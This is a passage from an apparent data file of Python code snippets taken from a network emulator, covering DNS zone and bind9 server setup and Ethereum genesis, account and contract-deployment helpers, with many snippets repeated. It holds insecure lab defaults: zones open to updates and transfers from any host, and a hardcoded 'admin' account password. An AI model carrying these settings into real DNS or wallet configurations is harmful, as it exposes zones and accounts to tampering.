super().render(emulator)\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'DomainNameService:\\n'\n\n        indent += 4\n        out += self.__rootZone.print(indent)\n\n        return out",
  "def __init__(self, name: str):\n        \"\"\"!\n        @brief Zone constructor.\n        \n        @param name full zonename.\n        \"\"\"\n        self.__zonename = name\n        self.__subzones = {}\n        self.__records = [\n            '$TTL 300',\n            '$ORIGIN {}'.format(name if name != '' else '.')\n        ]\n        self.__gules = []\n        self.__pending_records = {}",
  "def getName(self) -> str:\n        \"\"\"!\n        @brief Get zonename.\n\n        @returns zonename.\n        \"\"\"\n        return self.__zonename",
  "def getSubZone(self, name: str) -> Zone:\n        \"\"\"!\n        @brief Get a subzone, if not exists, a new one will be created.\n\n        @param name partial zonename. For example, if current zone is \"com.\", to\n        get \"example.com.\", use getSubZone(\"example\")\n\n        @returns zone.\n        @throws AssertionError if invalid zonename.\n        \"\"\"\n        assert '.' not in name, 'invalid subzone name \"{}\"'.format(name)\n        if name in self.__subzones: return self.__subzones[name]\n        self.__subzones[name] = Zone('{}.{}'.format(name, self.__zonename if self.__zonename != '.' else ''))\n        return self.__subzones[name]",
  "def getSubZones(self) -> Dict[str, Zone]:\n        \"\"\"!\n        @brief Get all subzones.\n\n        @return subzones dict.\n        \"\"\"\n        return self.__subzones",
  "def addRecord(self, record: str) -> Zone:\n        \"\"\"!\n        @brief Add a new record to zone.\n\n        @todo NS?\n        \n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__records.append(record)\n\n        return self",
  "def deleteRecord(self, record: str) -> Zone:\n        \"\"\"!\n        @brief Delete the record from zone.\n\n        @todo NS?\n        \n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__records.remove(record)\n\n        return self",
  "def addGuleRecord(self, fqdn: str, addr: str) -> Zone:\n        \"\"\"!\n        @brief Add a new gule record.\n\n        Use this method to register a name server in the parent zone.\n\n        @param fqdn full domain name of the name server.\n        @param addr IP address of the name server.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        if fqdn[-1] != '.': fqdn += '.'\n        zonename = self.__zonename if self.__zonename != '' else '.' \n        self.__gules.append('{} A {}'.format(fqdn, addr))\n        self.__gules.append('{} NS {}'.format(zonename, fqdn))\n\n        return self",
  "def resolveTo(self, name: str, node: Node) -> Zone:\n        \"\"\"!\n        @brief Add a new A record, pointing to the given node.\n\n        @param name name.\n        @param node node.\n\n        @throws AssertionError if node does not have valid interfaces.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        address: str = None\n        ifaces = node.getInterfaces()\n        assert len(ifaces) > 0, 'Node has no interfaces.'\n        for iface in ifaces:\n            net = iface.getNet()\n            if net.getType() == NetworkType.Host or net.getType() == NetworkType.Local:\n                address = iface.getAddress()\n                break\n\n        assert address != None, 'Node has no valid interfaces.'\n        self.__records.append('{} A {}'.format(name, address))\n\n        return self",
  "def resolveToVnode(self, name: str, vnode: str) -> Zone:\n        \"\"\"!\n        @brief Add a new A record, pointing to the given virtual node name.\n\n        @param name name.\n        @param vnode  virtual node name.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__pending_records[name] = vnode\n\n        return self",
  "def resolvePendingRecords(self, emulator: Emulator):\n        \"\"\"!\n        @brief resolve pending records in this zone.\n\n        @param emulator emulator object.\n        \"\"\"\n        for (domain_name, vnode_name) in self.__pending_records.items():\n            pnode = emulator.resolvVnode(vnode_name)\n\n            ifaces = pnode.getInterfaces()\n            assert len(ifaces) > 0, 'resolvePendingRecords(): node as{}/{} has no interfaces'.format(pnode.getAsn(), pnode.getName())\n            addr = ifaces[0].getAddress()\n\n            self.addRecord('{} A {}'.format(domain_name, addr))",
  "def getPendingRecords(self) -> Dict[str, str]:\n        \"\"\"!\n        @brief Get pending records.\n\n        @returns dict, where key is domain name, and value is vnode name.\n        \"\"\"\n        return self.__pending_records",
  "def getRecords(self) -> List[str]:\n        \"\"\"!\n        @brief Get all records.\n\n        @return list of records.\n        \"\"\"\n        return self.__records",
  "def getGuleRecords(self) -> List[str]:\n        \"\"\"!\n        @brief Get all gule records.\n\n        @return list of records.\n        \"\"\"\n        return self.__gules",
  "def findRecords(self, keyword: str) -> List[str]:\n        \"\"\"!\n        @brief Find a record.\n\n        @param keyword keyword.\n\n        @return list of records.\n        \"\"\"\n        return [ r for r in self.__records if keyword in r ]",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        zonename = self.__zonename if self.__zonename != '' else '(root zone)'\n        out += 'Zone \"{}\":\\n'.format(zonename)\n\n        indent += 4\n        out += ' ' * indent\n        out += 'Zonefile:\\n'\n\n        indent += 4\n        for record in self.__records:\n            out += ' ' * indent\n            out += '{}\\n'.format(record)\n\n        indent -= 4\n        out += ' ' * indent\n        out += 'Subzones:\\n'\n        \n        indent += 4\n        for subzone in self.__subzones.values():\n            out += subzone.print(indent)\n\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief DomainNameServer constructor.\n        \"\"\"\n        super().__init__()\n        \n        self.__zones = set()\n        self.__is_master = False\n        self.__is_real_root = False",
  "def addZone(self, zonename: str, createNsAndSoa: bool = True) -> DomainNameServer:\n        \"\"\"!\n        @brief Add a zone to this node.\n\n        @param zonename name of zone to host.\n        @param createNsAndSoa add NS and SOA (if doesn't already exist) to zone. \n\n        You should use DomainNameService.hostZoneOn to host zone on node if you\n        want the automated NS record to work.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__zones.add((zonename, createNsAndSoa))\n\n        return self",
  "def setMaster(self) -> DomainNameServer:\n        \"\"\"!\n        @brief set the name server to be master name server.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__is_master = True\n\n        return self",
  "def setRealRootNS(self) -> DomainNameServer:\n        \"\"\"!\n        @brief set the name server to be a real root name server.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__is_real_root = True\n\n        return self",
  "def getNode(self) -> Node:\n        \"\"\"!\n        @brief get node associated with the server. Note that this only works\n        after the services is configured.\n        \"\"\"\n        return self.__node",
  "def getZones(self) -> List[str]:\n        \"\"\"!\n        @brief Get list of zones hosted on the node.\n\n        @returns list of zones.\n        \"\"\"\n        zones = []\n        for (z, _) in self.__zones: zones.append(z)\n        return zones",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        (scope, _, name) = self.__node.getRegistryInfo()\n        out += 'Zones on as{}/{}:\\n'.format(scope, name)\n        indent += 4\n        for (zone, _) in self.__zones:\n            out += ' ' * indent\n            if zone == '' or zone[-1] != '.': zone += '.'\n            out += '{}\\n'.format(zone)\n\n        return out",
  "def __getRealRootRecords(self):\n        \"\"\"!\n        @brief Helper tool, get real-world root zone records list by\n        RIPE RIS.\n\n        @throw AssertionError if API failed.\n        \"\"\"\n        rules = []\n        rslt = requests.get(ROOT_ZONE_URL)\n\n        assert rslt.status_code == 200, 'RIPEstat API returned non-200'\n        \n        rules_byte = rslt.iter_lines()\n        \n        for rule_byte in rules_byte:\n            line_str:str = rule_byte.decode('utf-8')\n            if not line_str.startswith('.'):\n                rules.append(line_str)\n        \n        return rules",
  "def configure(self, node: Node, dns: DomainNameService):\n        \"\"\"!\n        @brief configure the node.\n        \"\"\"\n        self.__node = node\n\n        for (_zonename, auto_ns_soa) in self.__zones:\n            zone = dns.getZone(_zonename)\n            zonename = zone.getName()\n\n            if auto_ns_soa:\n                ifaces = node.getInterfaces()\n                assert len(ifaces) > 0, 'node has not interfaces'\n                addr = ifaces[0].getAddress()\n\n                if self.__is_master:\n                    dns.addMasterIp(zonename, str(addr))\n\n                if zonename[-1] != '.': zonename += '.'\n                if zonename == '.': zonename = ''\n\n                if len(zone.findRecords('SOA')) == 0:\n                    zone.addRecord('@ SOA {} {} {} 900 900 1800 60'.format('ns1.{}'.format(zonename), 'admin.{}'.format(zonename), randint(1, 0xffffffff)))\n\n                #If there are multiple zone servers, increase the NS number for ns name.\n                ns_number = 1\n                while (True):\n                    if len(zone.findRecords('ns{}.{} A '.format(str(ns_number), zonename))) > 0:\n                        ns_number +=1\n                    else:\n                        break\n\n                zone.addGuleRecord('ns{}.{}'.format(str(ns_number), zonename), addr)\n                zone.addRecord('ns{}.{} A {}'.format(str(ns_number), zonename, addr))\n                zone.addRecord('@ NS ns{}.{}'.format(str(ns_number), zonename))\n                \n            if zone.getName() == \".\" and self.__is_real_root:\n                for record in self.__getRealRootRecords():\n                    zone.addRecord(record)",
  "def install(self, node: Node, dns: DomainNameService):\n        \"\"\"!\n        @brief Handle the installation.\n        \"\"\"\n        assert node == self.__node, 'configured node differs from install node. Please check if there are conflict bindings'\n\n        node.addSoftware('bind9')\n        node.appendStartCommand('echo \"include \\\\\"/etc/bind/named.conf.zones\\\\\";\" >> /etc/bind/named.conf.local')\n        node.setFile('/etc/bind/named.conf.options', DomainNameServiceFileTemplates['named_options'])\n        node.setFile('/etc/bind/named.conf.zones', '')\n\n        for (_zonename, auto_ns_soa) in self.__zones:\n            zone = dns.getZone(_zonename)\n            zonename = filename = zone.getName()\n\n            if zonename == '' or zonename == '.':\n                filename = 'root'\n                zonename = '.'\n            zonepath = '/etc/bind/zones/{}'.format(filename)\n            node.setFile(zonepath, '\\n'.join(zone.getRecords()))\n\n            if self.__is_master:\n                node.appendFile('/etc/bind/named.conf.zones',\n                        'zone \"{}\" {{ type master; notify yes; allow-transfer {{ any; }}; file \"{}\"; allow-update {{ any; }}; }};\\n'.format(zonename, zonepath)\n                    )\n            elif zone.getName() in dns.getMasterIp().keys(): # Check if there are some master servers\n                master_ips = ';'.join(dns.getMasterIp()[zone.getName()])\n                node.appendFile('/etc/bind/named.conf.zones',\n                    'zone \"{}\" {{ type slave; masters {{ {}; }}; file \"{}\"; }};\\n'.format(zonename, master_ips, zonepath)\n                )\n            else:\n                node.appendFile('/etc/bind/named.conf.zones',\n                    'zone \"{}\" {{ type master; file \"{}\"; allow-update {{ any; }}; }};\\n'.format(zonename, zonepath)\n                )\n\n        node.appendStartCommand('chown -R bind:bind /etc/bind/zones')\n        node.appendStartCommand('service named start')",
  "def __init__(self, autoNameServer: bool = True):\n        \"\"\"!\n        @brief DomainNameService constructor.\n        \n        @param autoNameServer add gule records to parents automatically.\n        \"\"\"\n        super().__init__()\n        self.__autoNs = autoNameServer\n        self.__rootZone = Zone('.')\n        self.__masters = {}\n        self.addDependency('Base', False, False)",
  "def __autoNameServer(self, zone: Zone):\n        \"\"\"!\n        @brief Try to automatically add NS records of children to parent zones.\n\n        @param zone root zone reference.\n        \"\"\"\n        if (len(zone.getSubZones().values()) == 0): return\n        self._log('Collecting subzones NSes of \"{}\"...'.format(zone.getName()))\n        for subzone in zone.getSubZones().values():\n            for gule in subzone.getGuleRecords(): zone.addRecord(gule)\n            self.__autoNameServer(subzone)",
  "def __resolvePendingRecords(self, emulator: Emulator, zone: Zone):\n        zone.resolvePendingRecords(emulator)\n        self._log('resloving pending records for zone \"{}\"...'.format(zone.getName()))\n        for subzone in zone.getSubZones().values():\n            self.__resolvePendingRecords(emulator, subzone)",
  "def _createServer(self) -> Server:\n        return DomainNameServer()",
  "def _doConfigure(self, node: Node, server: DomainNameServer):\n        server.configure(node, self)",
  "def configure(self, emulator: Emulator):\n        self.__resolvePendingRecords(emulator, self.__rootZone)\n        return super().configure(emulator)",
  "def _doInstall(self, node: Node, server: DomainNameServer):\n        server.install(node, self)",
  "def getName(self):\n        return 'DomainNameService'",
  "def getConflicts(self) -> List[str]:\n        return ['DomainNameCachingService']",
  "def getZone(self, domain: str) -> Zone:\n        \"\"\"!\n        @brief Get a zone, create it if not exist.\n\n        This method only create the zone. Host it with hostZoneOn.\n\n        @param domain zone name.\n\n        @returns zone handler.\n        \"\"\"\n        if domain == '.' or domain == '': return self.__rootZone\n        path: List[str] = sub(r'\\.$', '', domain).split('.')\n        path.reverse()\n        zoneptr = self.__rootZone\n        for z in path:\n            zoneptr = zoneptr.getSubZone(z)\n\n        return zoneptr",
  "def getRootZone(self) -> Zone:\n        \"\"\"!\n        @brief Get the root zone.\n\n        @return root zone.\n        \"\"\"\n        return self.__rootZone",
  "def getZoneServerNames(self, domain: str) -> List[str]:\n        \"\"\"!\n        @brief Get the names of servers hosting the given zone. This only works\n        if the server was installed by using the \"installByName\" call.\n\n        @param domain domain.\n\n        @returns list of tuple of (node name, asn)\n        \"\"\"\n        info = []\n        targets = self.getPendingTargets()\n\n        for (vnode, sobj) in targets.items():\n            server: DomainNameServer = sobj\n\n            hit = False\n\n            for zone in server.getZones():\n                if zone.getName() == domain:\n                    info.append(vnode)\n                    hit = True\n                    break\n            \n            if hit: continue\n        \n        return info",
  "def addMasterIp(self, zone: str, addr: str) -> DomainNameService:\n        \"\"\"!\n        @brief add master name server IP address.\n\n        @param addr the IP address of master zone server.\n        @param zone the zone name, e.g : com.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        if zone in self.__masters.keys():\n            self.__masters[zone].append(addr)\n        else:\n            self.__masters[zone] = [addr]\n\n        return self",
  "def setAllMasterIp(self, masters: Dict[str: List[str]]):\n        \"\"\"!\n        @brief override all master IPs, to be used for merger. Do not use unless\n        you know what you are doing.\n\n        @param masters master dict.\n        \"\"\"\n        self.__masters = masters",
  "def getMasterIp(self) -> Dict [str, List[str]]:\n        \"\"\"!\n        @brief get all master name server IP address.\n\n        @return list of ip address\n        \"\"\"\n        return self.__masters",
  "def render(self, emulator: Emulator):\n        if self.__autoNs:\n            self._log('Setting up NS records...')\n            self.__autoNameServer(self.__rootZone)\n\n        super().render(emulator)",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'DomainNameService:\\n'\n\n        indent += 4\n        out += self.__rootZone.print(indent)\n\n        return out",
  "class Genesis():\n    \"\"\"!\n    @brief Genesis manage class\n    \"\"\"\n\n    __genesis:dict\n    __consensusMechanism:ConsensusMechanism\n    \n    def __init__(self, consensus:ConsensusMechanism):\n        self.__consensusMechanism = consensus\n        self.__genesis = json.loads(GenesisFileTemplates[self.__consensusMechanism.value])\n        self.__genesis[\"timestamp\"] = hex(int((time())))\n\n\n    def setGenesis(self, customGenesis:str):\n        \"\"\"!\n        @brief set custom genesis \n\n        @param customGenesis genesis file contents to set. \n\n        @returns self, for chaining calls.\n        \"\"\"\n        self.__genesis = json.loads(customGenesis)\n\n        return self\n\n    def getGenesis(self) -> str:\n        \"\"\"!\n        @brief get a string format of genesis block.\n        \n        returns genesis.\n        \"\"\"\n        return json.dumps(self.__genesis)\n\n    def addAccounts(self, accounts:List[AccountStructure]) -> Genesis:\n        \"\"\"!\n        @brief allocate balance to account by setting alloc field of genesis file.\n\n        @param accounts list of accounts to allocate balance. \n\n        @returns self, for chaining calls.\n        \"\"\"\n        for account in accounts:\n            address = account.address\n            balance = account.balance\n\n            assert balance >= 0, \"Genesis::addAccounts: balance cannot have a negative value. Requested Balance Value : {}\".format(account.getBalance())\n            self.__genesis[\"alloc\"][address[2:]] = {\"balance\":\"{}\".format(balance)}\n\n        return self\n\n    def addLocalAccount(self, address:str, balance:int) -> Genesis:\n        \"\"\"!\n        @brief allocate balance to a local account by setting alloc field of genesis file.\n\n        @param address : external account's address to allocate balance\n\n        @param balance\n\n        @returns self, for chaining calls.\n        \"\"\"\n\n        assert balance >= 0, \"Genesis::allocateBalance: balance cannot have a negative value. Requested Balance Value : {}\".format(balance)\n        checksum_address = Web3.toChecksumAddress(address)\n        self.__genesis[\"alloc\"][checksum_address[2:]] = {\"balance\":\"{}\".format(balance)}\n\n        return self\n\n    def setSigner(self, accounts:List[AccountStructure]) -> Genesis:\n        \"\"\"!\n        @brief set initial signers by setting extraData field of genesis file. \n        \n        extraData property in genesis block consists of \n        32bytes of vanity data, a list of initial signer addresses, \n        and 65bytes of vanity data.\n\n        @param accounts account lists to set as signers.\n\n        @returns self, for chaining API calls. \n        \"\"\"\n\n        assert self.__consensusMechanism == ConsensusMechanism.POA, 'setSigner method supported only in POA consensus.'\n\n        signerAddresses = ''\n\n        for account in accounts:\n            signerAddresses = signerAddresses + account.address[2:]\n        \n        self.__genesis[\"extraData\"] = GenesisFileTemplates['POA_extra_data'].format(signer_addresses=signerAddresses)\n\n        return self\n\n    def setGasLimit(self, gasLimit:int) -> Genesis:\n        \"\"\"!\n        @brief set GasLimit (the limit of gas cost per block)\n\n        @param int\n        \n        @returns self, for chaining API calls\n        \"\"\"\n\n        self.__genesis[\"gasLimit\"] = hex(gasLimit) \n\n        return self\n\n    def setChainId(self, chainId:int) -> Genesis:\n        \"\"\"!\n        @brief set ChainId\n        @param int\n        @returns self, for chaining API calls\n        \"\"\"\n\n        self.__genesis[\"config\"][\"chainId\"] = chainId\n\n        return self",
  "class AccountStructure():\n    address: str    \n    keystore_content: str  \n    keystore_filename:str  \n    balance: int\n    password: str\n\n    def __init__(self, address:str, balance:int, keystore_filename:str, keystore_content:str,  password:str):\n        self.address = address\n        self.keystore_content = keystore_content\n        self.keystore_filename = keystore_filename\n        self.balance = balance\n        self.password = password",
  "class EthAccount():\n    \"\"\"\n    @brief Ethereum Local Account.\n    \"\"\"\n    \n    @staticmethod \n    def importAccount(keyfilePath: str, balance:int, password = \"admin\"):\n        \"\"\"\n        @brief import account from keyfile\n        \"\"\"\n        from eth_account import Account\n        EthAccount._log('importing eth account...')\n        assert path.exists(keyfilePath), \"EthAccount::__importAccount: keyFile does not exist. path : {}\".format(keyfilePath)\n        f = open(keyfilePath, \"r\")\n        keyfileContent = f.read()\n        f.close()\n        \n        account = Account.from_key(Account.decrypt(keyfile_json=keyfileContent,password=password))\n\n        keystore_content = json.dumps(EthAccount.__encryptAccount(account=account, password=password))\n\n        datastr = datetime.now(timezone.utc).isoformat().replace(\"+00:00\", \"000Z\").replace(\":\",\"-\")\n        keystore_filename = \"UTC--\"+datastr+\"--\"+account.address\n\n        return AccountStructure(account.address, balance, keystore_filename, keystore_content, password)\n\n    @staticmethod\n    def __encryptAccount(account, password:str):\n        from eth_account import Account\n        while True:\n            keystore = Account.encrypt(account.key, password=password)\n            if len(keystore['crypto']['cipherparams']['iv']) == 32:\n                return keystore\n\n    @staticmethod\n    def createEmulatorAccountFromMnemonic(id:int, mnemonic:str, balance:int, index:int, password:str):\n        from eth_account import Account\n        Account.enable_unaudited_hdwallet_features()\n\n        EthAccount._log('creating node_{} emulator account {} from mnemonic...'.format(id, index))\n        acct = Account.from_mnemonic(mnemonic, account_path=ETH_ACCOUNT_KEY_DERIVATION_PATH.format(id=id, index=index))\n        address = Web3.toChecksumAddress(acct.address)\n        \n        keystore_content = json.dumps(EthAccount.__encryptAccount(account=acct, password=password))\n        datastr = datetime.now(timezone.utc).isoformat().replace(\"+00:00\", \"000Z\").replace(\":\",\"-\")\n        keystore_filename = \"UTC--\"+datastr+\"--\"+address\n        \n        return AccountStructure(address, balance, keystore_filename, keystore_content, password)\n\n    @staticmethod\n    def createEmulatorAccountsFromMnemonic(id:int, mnemonic:str, balance:int, total:int, password:str):\n        accounts = []\n        index = 0 \n        for i in range(total):    \n            accounts.append(EthAccount.createEmulatorAccountFromMnemonic(id, mnemonic, balance, index, password))\n            index += 1\n        \n        return accounts\n\n    @staticmethod\n    def createLocalAccountFromMnemonic(mnemonic:str, balance:int, index:int):\n        from eth_account import Account\n        Account.enable_unaudited_hdwallet_features()\n\n        EthAccount._log('creating local account {} from mnemonic...'.format(index))\n        acct = Account.from_mnemonic(mnemonic, account_path=LOCAL_ACCOUNT_KEY_DERIVATION_PATH.format(index=index))\n        address = Web3.toChecksumAddress(acct.address)\n\n        return AccountStructure(address, balance, \"\", \"\", \"\")\n\n    @staticmethod\n    def createLocalAccountsFromMnemonic(mnemonic:str, balance:int, total:int):\n        accounts = []\n        index = 0 \n        for i in range(total):\n            accounts.append(EthAccount.createLocalAccountFromMnemonic(mnemonic, balance, index))\n            index += 1\n\n        return accounts\n\n    @staticmethod\n    def _log(message: str) -> None:\n        \"\"\"!\n        @brief Log to stderr.\n        \"\"\"\n        print(\"==== EthAccount: {}\".format(message), file=stderr)",
  "class SmartContract():\n\n    __abi_file_name: str\n    __bin_file_name: str\n\n    def __init__(self, contract_file_bin, contract_file_abi):\n        self.__abi_file_name = contract_file_abi\n        self.__bin_file_name = contract_file_bin\n\n    def __getContent(self, file_name):\n        \"\"\"!\n        @brief get Content of the file_name.\n        @param file_name from which we want to read data.\n        \n        @returns Contents of the file_name.\n        \"\"\"\n        file = open(file_name, \"r\")\n        data = file.read()\n        file.close()\n        return data.replace(\"\\n\",\"\")\n        \n\n    def generateSmartContractCommand(self):\n        \"\"\"!\n        @brief generates a shell command which deploys the smart Contract on the ethereum network.\n        @param contract_file_bin binary file of the smart Contract.\n        @param contract_file_abi abi file of the smart Contract.\n        \n        @returns shell command in the form of string.\n        \"\"\"\n        abi = \"abi = {}\".format(self.__getContent(self.__abi_file_name))\n        byte_code = \"byteCode = \\\"0x{}\\\"\".format(self.__getContent(self.__bin_file_name))\n        unlock_account = \"personal.unlockAccount(eth.accounts[0], \\\"{}\\\")\".format(\"admin\")\n        contract_command = \"testContract = eth.contract(abi).new({ from: eth.accounts[0], data: byteCode, gas: 1000000})\"\n        display_contract_Info = \"testContract\"\n        finalCommand = \"{},{},{},{},{}\".format(abi, byte_code, unlock_account, contract_command, display_contract_Info)\n\n        SmartContractCommand = \"sleep 30 \\n \\\n        while true \\n\\\n        do \\n\\\n        \\t balanceCommand=\\\"geth --exec 'eth.getBalance(eth.accounts[0])' attach\\\" \\n\\\n        \\t balance=$(eval \\\"$balanceCommand\\\") \\n\\\n        \\t minimumBalance=1000000 \\n\\\n        \\t if [ $balance -lt $minimumBalance ] \\n\\\n        \\t then \\n \\\n        \\t \\t sleep 60 \\n \\\n        \\t else \\n \\\n        \\t \\t break \\n \\\n        \\t fi \\n \\\n        done \\n \\\n        echo \\\"Balance ========> $balance\\\" \\n\\\n        gethCommand=\\'{}\\'\\n\\\n        finalCommand=\\'geth --exec \\\"$gethCommand\\\" attach\\'\\n\\\n        result=$(eval \\\"$finalCommand\\\")\\n\\\n        touch transaction.txt\\n\\\n        echo \\\"transaction hash $result\\\" \\n\\\n        echo \\\"$result\\\" >> transaction.txt\\n\\\n        \".format(finalCommand)\n        return SmartContractCommand",
  "def __init__(self, consensus:ConsensusMechanism):\n        self.__consensusMechanism = consensus\n        self.__genesis = json.loads(GenesisFileTemplates[self.__consensusMechanism.value])\n        self.__genesis[\"timestamp\"] = hex(int((time())))",
  "def setGenesis(self, customGenesis:str):\n        \"\"\"!\n        @brief set custom genesis \n\n        @param customGenesis genesis file contents to set. \n\n        @returns self, for chaining calls.\n        \"\"\"\n        self.__genesis = json.loads(customGenesis)\n\n        return self",
  "def getGenesis(self) -> str:\n        \"\"\"!\n        @brief get a string format of genesis block.\n        \n        returns genesis.\n        \"\"\"\n        return json.dumps(self.__genesis)",
  "def addAccounts(self, accounts:List[AccountStructure]) -> Genesis:\n        \"\"\"!\n        @brief allocate balance to account by setting alloc field of genesis file.\n\n        @param accounts list of accounts to allocate balance. \n\n        @returns self, for chaining calls.\n        \"\"\"\n        for account in accounts:\n            address = account.address\n            balance = account.balance\n\n            assert balance >= 0, \"Genesis::addAccounts: balance cannot have a negative value. Requested Balance Value : {}\".format(account.getBalance())\n            self.__genesis[\"alloc\"][address[2:]] = {\"balance\":\"{}\".format(balance)}\n\n        return self",
  "def addLocalAccount(self, address:str, balance:int) -> Genesis:\n        \"\"\"!\n        @brief allocate balance to a local account by setting alloc field of genesis file.\n\n        @param address : external account's address to allocate balance\n\n        @param balance\n\n        @returns self, for chaining calls.\n        \"\"\"\n\n        assert balance >= 0, \"Genesis::allocateBalance: balance cannot have a negative value. Requested Balance Value : {}\".format(balance)\n        checksum_address = Web3.toChecksumAddress(address)\n        self.__genesis[\"alloc\"][checksum_address[2:]] = {\"balance\":\"{}\".format(balance)}\n\n        return self",
  "def setSigner(self, accounts:List[AccountStructure]) -> Genesis:\n        \"\"\"!\n        @brief set initial signers by setting extraData field of genesis file. \n        \n        extraData property in genesis block consists of \n        32bytes of vanity data, a list of initial signer addresses, \n        and 65bytes of vanity data.\n\n        @param accounts account lists to set as signers.\n\n        @returns self, for chaining API calls. \n        \"\"\"\n\n        assert self.__consensusMechanism == ConsensusMechanism.POA, 'setSigner method supported only in POA consensus.'\n\n        signerAddresses = ''\n\n        for account in accounts:\n            signerAddresses = signerAddresses + account.address[2:]\n        \n        self.__genesis[\"extraData\"] = GenesisFileTemplates['POA_extra_data'].format(signer_addresses=signerAddresses)\n\n        return self",
  "def setGasLimit(self, gasLimit:int) -> Genesis:\n        \"\"\"!\n        @brief set GasLimit (the limit of gas cost per block)\n\n        @param int\n        \n        @returns self, for chaining API calls\n        \"\"\"\n\n        self.__genesis[\"gasLimit\"] = hex(gasLimit) \n\n        return self",
  "def setChainId(self, chainId:int) -> Genesis:\n        \"\"\"!\n        @brief set ChainId\n        @param int\n        @returns self, for chaining API calls\n        \"\"\"\n\n        self.__genesis[\"config\"][\"chainId\"] = chainId\n\n        return self",
  "def __init__(self, address:str, balance:int, keystore_filename:str, keystore_content:str,  password:str):\n        self.address = address\n        self.keystore_content = keystore_content\n        self.keystore_filename = keystore_filename\n        self.balance = balance\n        self.password = password",
  "def importAccount(keyfilePath: str, balance:int, password = \"admin\"):\n        \"\"\"\n        @brief import account from keyfile\n        \"\"\"\n        from eth_account import Account\n        EthAccount._log('importing eth account...')\n        assert path.exists(keyfilePath), \"EthAccount::__importAccount: keyFile does not exist. path : {}\".format(keyfilePath)\n        f = open(keyfilePath, \"r\")\n        keyfileContent = f.read()\n        f.close()\n        \n        account = Account.from_key(Account.decrypt(keyfile_json=keyfileContent,password=password))\n\n        keystore_content = json.dumps(EthAccount.__encryptAccount(account=account, password=password))\n\n        datastr = datetime.now(timezone.utc).isoformat().replace(\"+00:00\", \"000Z\").replace(\":\",\"-\")\n        keystore_filename = \"UTC--\"+datastr+\"--\"+account.address\n\n        return AccountStructure(account.address, balance, keystore_filename, keystore_content, password)",
  "def __encryptAccount(account, password:str):\n        from eth_account import Account\n        while True:\n            keystore = Account.encrypt(account.key, password=password)\n            if len(keystore['crypto']['cipherparams']['iv']) == 32:\n                return keystore",
  "def createEmulatorAccountFromMnemonic(id:int, mnemonic:str, balance:int, index:int, password:str):\n        from eth_account import Account\n        Account.enable_unaudited_hdwallet_features()\n\n        EthAccount._log('creating node_{} emulator account {} from mnemonic...'.format(id, index))\n        acct = Account.from_mnemonic(mnemonic, account_path=ETH_ACCOUNT_KEY_DERIVATION_PATH.format(id=id, index=index))\n        address = Web3.toChecksumAddress(acct.address)\n        \n        keystore_content = json.dumps(EthAccount.__encryptAccount(account=acct, password=password))\n        datastr = datetime.now(timezone.utc).isoformat().replace(\"+00:00\", \"000Z\").replace(\":\",\"-\")\n        keystore_filename = \"UTC--\"+datastr+\"--\"+address\n        \n        return AccountStructure(address, balance, keystore_filename, keystore_content, password)",
  "def createEmulatorAccountsFromMnemonic(id:int, mnemonic:str, balance:int, total:int, password:str):\n        accounts = []\n        index = 0 \n        for i in range(total):    \n            accounts.append(EthAccount.createEmulatorAccountFromMnemonic(id, mnemonic, balance, index, password))\n            index += 1\n        \n        return accounts",
  "def createLocalAccountFromMnemonic(mnemonic:str, balance:int, index:int):\n        from eth_account import Account\n        Account.enable_unaudited_hdwallet_features()\n\n        EthAccount._log('creating local account {} from mnemonic...'.format(index))\n        acct = Account.from_mnemonic(mnemonic, account_path=LOCAL_ACCOUNT_KEY_DERIVATION_PATH.format(index=index))\n        address = Web3.toChecksumAddress(acct.address)\n\n        return AccountStructure(address, balance, \"\", \"\", \"\")",
  "def createLocalAccountsFromMnemonic(mnemonic:str, balance:int, total:int):\n        accounts = []\n        index = 0 \n        for i in range(total):\n            accounts.append(EthAccount.createLocalAccountFromMnemonic(mnemonic, balance, index))\n            index += 1\n\n        return accounts",
  "def _log(message: str) -> None:\n        \"\"\"!\n        @brief Log to stderr.\n        \"\"\"\n        print(\"==== EthAccount: {}\".format(message), file=stderr)",
  "def __init__(self, contract_file_bin, contract_file_abi):\n        self.__abi_file_name = contract_file_abi\n        self.__bin_file_name = contract_file_bin",
  "def __getContent(self, file_name):\n        \"\"\"!\n        @brief get Content of the file_name.\n        @param file_name from which we want to read data.\n        \n        @returns Contents of the file_name.\n        \"\"\"\n        file = open(file_name, \"r\")\n        data = file.read()\n        file.close()\n        return data.replace(\"\\n\",\"\")",
  "def generateSmartContractCommand(self):\n        \"\"\"!\n        @brief generates a shell command which deploys the smart Contract on the ethereum network.\n        @param contract_file_bin binary file of the smart Contract.\n        @param contract_file_abi abi file of the smart Contract.\n        \n        @returns shell command in the form of string.\n        \"\"\"\n        abi = \"abi = {}\".format(self.__getContent(self.__abi_file_name))\n        byte_code = \"byteCode = \\\"0x{}\\\"\".format(self.__getContent(self.__bin_file_name))\n        unlock_account = \"personal.unlockAccount(eth.accounts[0], \\\"{}\\\")\".format(\"admin\")\n        contract_command = \"testContract = eth.contract(abi).new({ from: eth.accounts[0], data: byteCode, gas: 1000000})\"\n        display_contract_Info = \"testContract\"\n        finalCommand = \"{},{},{},{},{}\".format(abi, byte_code, unlock_account, contract_command, display_contract_Info)\n\n        SmartContractCommand = \"sleep 30 \\n \\\n        while true \\n\\\n        do \\n\\\n        \\t balanceCommand=\\\"geth --exec 'eth.getBalance(eth.accounts[0])' attach\\\" \\n\\\n        \\t balance=$(eval \\\"$balanceCommand\\\") \\n\\\n        \\t minimumBalance=1000000 \\n\\\n        \\t if [ $balance -lt $minimumBalance ] \\n\\\n        \\t then \\n \\\n        \\t \\t sleep 60 \\n \\\n        \\t else \\n \\\n        \\t \\t break \\n \\\n        \\t fi \\n \\\n        done \\n \\\n        echo \\\"Balance ========> $balance\\\" \\n\\\n        gethCommand=\\'{}\\'\\n\\\n        